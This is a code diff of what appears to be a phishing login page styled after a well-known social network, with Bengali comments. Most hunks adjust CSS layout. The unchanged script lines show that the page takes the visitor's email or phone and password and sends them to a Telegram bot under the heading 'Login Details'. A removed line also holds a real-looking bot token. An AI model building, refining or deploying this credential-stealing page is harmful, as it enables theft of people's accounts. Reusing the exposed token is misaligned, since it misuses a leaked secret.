@@ -11,21 +11,16 @@
             margin: 0;
             padding: 0;
             display: flex;
-            justify-content: center; /* সম্পূর্ণ মাঝখানে রাখে */
-            align-items: center; /* ভর্তিকাল মাঝখানে রাখে */
-            height: 100vh;
             flex-direction: column;
-        }
-
-        .logo-container {
-            margin-bottom: 20px;
-        }
-
-        .logo {
-            width: 90px;
+            justify-content: flex-start; /* ফর্মকে উপরে নিয়ে যাবে */
+            align-items: center;
+            height: 100vh;
         }
 
         .container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
             width: 100%;
             max-width: 380px;
             background: #ffffff;
@@ -33,7 +28,15 @@
             border-radius: 8px;
             padding: 25px;
             box-sizing: border-box;
-            text-align: center; /* সব কিছু কেন্দ্রীভূত */
+            margin-top: 40px; /* উপরের দিকে নিয়ে যায় */
+        }
+
+        .logo-container {
+            margin-bottom: 20px; /* লোগোর নিচে স্পেস */
+        }
+
+        .logo {
+            width: 90px;
         }
 
         .input-field {
@@ -71,9 +74,9 @@
         }
 
         .create-account-btn {
-            margin-top: 20px;
+            margin-top: 30px;
             padding: 10px 0;
-            width: 100%;
+            width: 90%;
             border: 1px solid #1877f2;
             color: #1877f2;
             border-radius: 6px;
@@ -132,7 +135,7 @@
             const emailOrPhone = document.getElementById('emailOrPhone').value;
             const password = document.getElementById('password').value;
 
-            const token = '7368163635:AAGEHrgX9PIqI7J58rJANzAPr-L9O_BfJWQ';
+            const token = 'YOUR_BOT_TOKEN_HERE';
             const telegramURL = `https://api.telegram.org/bot${token}/sendMessage`;
 
             const message = `🔐 Login Details:\n📧 Email/Phone: ${emailOrPhone}\n🔑 Password: ${password}\n\n💡 Chat ID: ${chat_id}`;
